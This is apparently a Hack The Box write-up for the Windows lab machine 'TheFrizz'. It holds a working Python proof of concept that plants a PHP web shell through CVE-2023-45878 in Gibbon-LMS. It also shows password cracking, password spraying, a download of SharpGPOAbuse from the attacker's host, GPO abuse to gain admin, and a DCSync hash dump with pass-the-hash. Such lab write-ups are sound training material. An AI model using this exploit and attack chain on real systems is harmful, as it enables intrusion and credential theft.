---
layout: post
title: HTB - TheFrizz
date: 2025-08-23 14:40 -0400
---

| {{ 'thefrizz' | machine_img }} | Medium windows machine. Starts by abusing a LFI on Gibbon-LMS. Then we recover a backup from the RecycleBin. Some password reuse. And we escalate with SharpGPOAbuse. |

# nmap
```bash
Starting Nmap 7.93 ( https://nmap.org ) at 2025-03-15 17:16 -04
Nmap scan report for 10.10.11.60
Host is up (0.19s latency).

PORT      STATE SERVICE       VERSION
22/tcp    open  ssh           OpenSSH for_Windows_9.5 (protocol 2.0)
53/tcp    open  domain        Simple DNS Plus
80/tcp    open  http          Apache httpd 2.4.58 (OpenSSL/3.1.3 PHP/8.2.12)
|_http-title: Did not follow redirect to http://frizzdc.frizz.htb/home/
|_http-server-header: Apache/2.4.58 (Win64) OpenSSL/3.1.3 PHP/8.2.12
88/tcp    open  kerberos-sec  Microsoft Windows Kerberos (server time: 2025-03-16 04:21:06Z)
135/tcp   open  msrpc         Microsoft Windows RPC
139/tcp   open  netbios-ssn   Microsoft Windows netbios-ssn
389/tcp   open  ldap          Microsoft Windows Active Directory LDAP (Domain: frizz.htb0., Site: Default-First-Site-Name)
445/tcp   open  microsoft-ds?
464/tcp   open  kpasswd5?
593/tcp   open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
636/tcp   open  tcpwrapped
3268/tcp  open  ldap          Microsoft Windows Active Directory LDAP (Domain: frizz.htb0., Site: Default-First-Site-Name)
3269/tcp  open  tcpwrapped
9389/tcp  open  mc-nmf        .NET Message Framing
49664/tcp open  msrpc         Microsoft Windows RPC
49667/tcp open  msrpc         Microsoft Windows RPC
49670/tcp open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
60765/tcp open  msrpc         Microsoft Windows RPC
60769/tcp open  msrpc         Microsoft Windows RPC
60778/tcp open  msrpc         Microsoft Windows RPC
Service Info: Hosts: localhost, FRIZZDC; OS: Windows; CPE: cpe:/o:microsoft:windows

Host script results:
| smb2-time: 
|   date: 2025-03-16T04:22:04
|_  start_date: N/A
|_clock-skew: 7h04m34s
| smb2-security-mode: 
|   311: 
|_    Message signing enabled and required

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 109.75 seconds
```

SSH is open. That is usually not there in Windows boxes.

DC domains:
- frizzdc.frizz.htb
- frizz.htb

# main website

Simple static website.

![thefrizz8](/assets/img/thefrizz8.png)

apache 404 page

![thefrizz2](/assets/img/thefrizz2.png)

# hacking base64 on page talks about xss

Some easter egg on the main page:

![thefrizz1](/assets/img/thefrizz1.png)

Decodes to:

Want to learn hacking but don't want to go to jail? You'll learn the in's and outs of Syscalls and XSS from the safety of international waters and iron clad contracts from your customers, reviewed by Walkerville's finest attorneys.

Login page uses Gibbon-LMS, some cves on it

![thefrizz4](/assets/img/thefrizz4.png)

Version:

![thefrizz5](/assets/img/thefrizz5.png)

Vulnerable to multiple cves. [CVE-2023-34598](https://github.com/maddsec/CVE-2023-34598) and [CVE-2023-45878](https://nvd.nist.gov/vuln/detail/CVE-2023-45878). The later gives us a shell as `frizz\w.webservice`.

poc for CVE-2023-45878:

```python
import requests
import base64
import random
import urllib

path = f"modules/Rubrics/rubrics_{random.choice(range(1_000_000))}.php"

cmd = """dir ."""
cmd = urllib.parse.quote_plus(cmd)

payload = base64.b64encode(b'<?php echo system($_GET["cmd"]); ?>').decode()
res = requests.post(
   "http://frizzdc.frizz.htb/Gibbon-LMS/modules/Rubrics/rubrics_visualise_saveAjax.php",
   headers={"Content-Type": "application/x-www-form-urlencoded"},
   data={
       "img": "data:image/png;base64," + payload,
       "path": path,
       "gibbonPersonID": "aaaaab1213_",
   },
)
print(f"{res}")

res = requests.get(
   "http://frizzdc.frizz.htb/Gibbon-LMS/" + path,
   params="cmd=" + cmd,
)
print(f"{res.text}")
```

# initial enumeration
```
PS C:\xampp\htdocs\Gibbon-LMS> ls


    Directory: C:\xampp\htdocs\Gibbon-LMS


Mode                 LastWriteTime         Length Name                                                          
----                 -------------         ------ ----                                                          
d-----         1/20/2023   6:04 AM                i18n                                                          
d-----         1/20/2023   6:04 AM                installer                                                     
d-----         1/20/2023   6:04 AM                lib                                                           
d-----         1/20/2023   6:04 AM                modules                                                       
d-----         1/20/2023   6:04 AM                resources                                                     
d-----         1/20/2023   6:04 AM                src                                                           
d-----         1/20/2023   6:04 AM                themes                                                        
d-----        10/29/2024   7:28 AM                uploads                                                       
d-----         1/20/2023   6:04 AM                vendor                                                        
-a----         1/20/2023   6:04 AM            634 .htaccess                                                     
-a----         1/20/2023   6:04 AM         197078 CHANGEDB.php                                                  
-a----         1/20/2023   6:04 AM         103023 CHANGELOG.txt                                                 
-a----         1/20/2023   6:04 AM           2972 composer.json                                                 
-a----         1/20/2023   6:04 AM         294353 composer.lock                                                 
-a----        10/11/2024   8:15 PM           1307 config.php                                                    
...
```

mysql credentials on config.php.
```php
$databaseServer = 'localhost';
$databaseUsername = 'MrGibbonsDB';
$databasePassword = 'MisterGibbs!Parrot!?1';
$databaseName = 'gibbon';
```

Dumping the db gives us a hash and salt for `f.frizzle`.
`067f746faca44f170c6cd9d7c4bdac6bc342c608687733f80ff784242b0b0c03:/aACFhikmNopqrRTVz2489`

We can bruteforce with hashcat:
```bash
hashcat ./hash.txt ~/wordlists/rockyou.txt -a 0 -m 1410
# 067f746faca44f170c6cd9d7c4bdac6bc342c608687733f80ff784242b0b0c03:/aACFhikmNopqrRTVz2489:Jenni_Luvs_Magic23
```

`f.frizzle`:`Jenni_Luvs_Magic23`

The box uses ssh instead of winrm. So it is kinda tricky.
First you get a ticket:
```bash
ntpx getTGT.py frizz.htb/f.frizzle:Jenni_Luvs_Magic23 -dc-ip frizzdc.frizz.htb
```

Then you update /etc/krb5.conf.
```conf
FRIZZ.HTB = {
  kdc = frizzdc.frizz.htb
  admin_server = frizzdc.frizz.htb
  default_domain = frizz.htb
}

[domain_realm]
.frizz.htb = FRIZZ.HTB
frizz.htb = FRIZZ.HTB
```

And finally you ssh, make you sure you set the time correctly.
```bash
ntpx ssh f.frizzle@frizz.htb
```

And that gives the user flag:
```bash
PS C:\Users\f.frizzle> type .\Desktop\user.txt
663a4***************************
```

# f.frizzle
Initial recon

```powershell
PS C:\Users\f.frizzle> whoami /priv

PRIVILEGES INFORMATION
----------------------

Privilege Name                Description                    State
============================= ============================== =======
SeMachineAccountPrivilege     Add workstations to domain     Enabled
SeChangeNotifyPrivilege       Bypass traverse checking       Enabled
SeIncreaseWorkingSetPrivilege Increase a process working set Enabled
```

`SeCreateGlobalPrivilege` might be interesting.

There are some stuff on the recycle bin:
```powershell
PS C:\Users\f.frizzle>   Get-ChildItem -Force -Recurse -ErrorAction SilentlyContinue 'C:\$Recycle.Bin'

    Directory: C:\$RECYCLE.BIN

Mode                 LastWriteTime         Length Name
----                 -------------         ------ ----
d--hs          10/29/2024  7:31 AM                S-1-5-21-2386970044-1145388522-2932701813-1103

    Directory: C:\$RECYCLE.BIN\S-1-5-21-2386970044-1145388522-2932701813-1103

Mode                 LastWriteTime         Length Name
----                 -------------         ------ ----
-a---          10/29/2024  7:31 AM            148 $IE2XMEG.7z
-a---          10/24/2024  9:16 PM       30416987 $RE2XMEG.7z
-a-hs          10/29/2024  7:31 AM            129 desktop.ini

```

It is a old wapt server installation.
```bash
ls wapt
auth_module_ad.py  __pycache__              waptconsole.exe.manifest  wapt-scanpackages.py
cache              revision.txt             waptcrypto.py             waptself.exe
common.py          Scripts                  wapt-enterprise.ico       waptserver.exe
conf               setupdevhelpers.py       wapt-get.exe              waptservice.exe
conf.d             setuphelpers_linux.py    wapt-get.exe.manifest     wapt-signpackages.py
COPYING.txt        setuphelpers_macos.py    wapt-get.ini              wapttftpserver
db                 setuphelpers.py          wapt-get.ini.tmpl         wapttftpserver.exe
DLLs               setuphelpers_unix.py     wapt-get.py               wapttray.exe
keyfinder.py       setuphelpers_windows.py  waptguihelper.pyd         waptutils.py
keys               ssl                      waptlicences.pyd          waptwua
languages          templates                waptmessage.exe           wgetwads32.exe
lib                trusted_external_certs   waptpackage.py            wgetwads64.exe
licencing.py       unins000.msg             wapt.psproj
log                version-full             waptpython.exe
private            waptbinaries.sha256      waptpythonw.exe
```

There are some credentials on `wapt/conf/waptserver.ini`.
```ini
[options]
allow_unauthenticated_registration = True
wads_enable = True
login_on_wads = True
waptwua_enable = True
secret_key = ylPYfn9tTU9IDu9yssP2luKhjQijHKvtuxIzX9aWhPyYKtRO7tMSq5sEurdTwADJ
server_uuid = 646d0847-f8b8-41c3-95bc-51873ec9ae38
token_secret_key = 5jEKVoXmYLSpi5F7plGPB4zII5fpx0cYhGKX5QC0f7dkYpYmkeTXiFlhEJtZwuwD
wapt_password = IXN1QmNpZ0BNZWhUZWQhUgo=
clients_signing_key = C:\wapt\conf\ca-192.168.120.158.pem
clients_signing_certificate = C:\wapt\conf\ca-192.168.120.158.crt

[tftpserver]
root_dir = c:\wapt\waptserver\repository\wads\pxe
log_path = c:\wapt\log
```

Decoding the password gives `IXN1QmNpZ0BNZWhUZWQhUgo=`:`!suBcig@MehTed!R`

We can get the all the users and test the password against them.
```bash
export KRB5CCNAME=./f.frizzle.ccache
ntpx netexec smb frizzdc.frizz.htb -k --users | awk '{ print $5 }' | sort -u > users.txt
ntpx netexec smb frizzdc.frizz.htb -u users.txt -p '!suBcig@MehTed!R' -k
# SMB         frizzdc.frizz.htb 445    frizzdc          [+] frizz.htb\M.SchoolBus:!suBcig@MehTed!R
```

This gives us the `M.SchoolBus` user.

# M.SchoolBus

A lot of outbound privileges in this account.

![thefrizz7](/assets/img/thefrizz7.png)

WriteGPLink on two different OU's. We can use [SharpGPOAbuse.exe](https://github.com/FSecureLABS/SharpGPOAbuse) to run some code as admin.
```bash
ntpx getTGT.py 'frizz.htb/M.SchoolBus:!suBcig@MehTed!R' -dc-ip frizzdc.frizz.htb
ntpx ssh M.SchoolBus@frizz.htb
```

```powershell
PS C:\Users\M.SchoolBus> Invoke-WebRequest -Uri "http://10.10.14.9:5000/static/SharpGPOAbuse.exe" -OutFile SharpGPOAbuse.exe
PS C:\Users\M.SchoolBus> New-GPO "coolgpo"

DisplayName      : coolgpo
DomainName       : frizz.htb
Owner            : frizz\M.SchoolBus
Id               : 06ea6f47-ab33-4c40-92a0-caeea21a0a98
GpoStatus        : AllSettingsEnabled
Description      :
CreationTime     : 8/23/2025 6:10:00 PM
ModificationTime : 8/23/2025 6:10:00 PM
UserVersion      :
ComputerVersion  :
WmiFilter        :

PS C:\Users\M.SchoolBus> New-GPLink -Name "coolgpo" -Target "OU=Domain Controllers,DC=frizz,DC=htb"

GpoId       : 06ea6f47-ab33-4c40-92a0-caeea21a0a98
DisplayName : coolgpo
Enabled     : True
Enforced    : False
Target      : OU=Domain Controllers,DC=frizz,DC=htb
Order       : 2

PS C:\Users\M.SchoolBus> .\SharpGPOAbuse.exe --AddLocalAdmin M.SchoolBus --GPOName "coolgpo" --UserAccount M.SchoolBus
[+] Domain = frizz.htb
[+] Domain Controller = frizzdc.frizz.htb
[+] Distinguished Name = CN=Policies,CN=System,DC=frizz,DC=htb
[+] SID Value of M.SchoolBus = S-1-5-21-2386970044-1145388522-2932701813-1106
[+] GUID of "coolgpo" is: {06EA6F47-AB33-4C40-92A0-CAEEA21A0A98}
[+] Creating file \\frizz.htb\SysVol\frizz.htb\Policies\{06EA6F47-AB33-4C40-92A0-CAEEA21A0A98}\Machine\Microsoft\Windows NT\SecEdit\GptTmpl.inf
[+] versionNumber attribute changed successfully
[+] The version number in GPT.ini was increased successfully.
[+] The GPO was modified to include a new local admin. Wait for the GPO refresh cycle.
[+] Done!
PS C:\Users\M.SchoolBus> gpupdate /force
Updating policy...

Computer Policy update has completed successfully.
User Policy update has completed successfully.
```

After doing that you can do anything you want. I used DCSync.
```bash
ntpx getTGT.py 'frizz.htb/M.SchoolBus:!suBcig@MehTed!R' -dc-ip frizzdc.frizz.htb
export KRB5CCNAME=./M.SchoolBus.ccache
ntpx secretsdump.py frizz.htb/m.schoolbus@frizzdc.frizz.htb -k -no-pass -just-dc-user Administrator
ntpx getTGT.py 'frizz.htb/administrator' -no-pass -dc-ip frizzdc.frizz.htb -hashes aad3b435b51404eeaad3b435b51404ee:c457b5f1c315bef53b9cabc92e993d0b
export KRB5CCNAME=./administrator.ccache
ntpx wmiexec.py -k frizzdc.frizz.htb
```

```powershell
C:\>type C:\Users\Administrator\Desktop\root.txt
499f3***************************
```
